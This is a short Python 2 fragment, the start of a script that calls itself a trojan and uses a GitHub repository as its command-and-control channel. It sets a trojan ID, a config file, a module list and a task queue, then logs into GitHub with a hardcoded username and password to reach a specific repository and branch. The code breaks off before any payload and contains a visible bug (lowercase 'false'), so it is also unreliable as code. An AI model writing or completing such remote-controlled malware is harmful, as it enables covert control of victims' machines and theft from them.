import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id="abc"
trojan_config="%s.json" % trojan_id
trojan_modules=[]
configured=false
task_queue=Queue.Queue()

def connect_to_github():
    gh=login(username="cmfcmf29",password="xxx")
    repo=gh.repository("cmfcmf29","777")
    branch=repo.branch("master")
    return gh,repo,branch
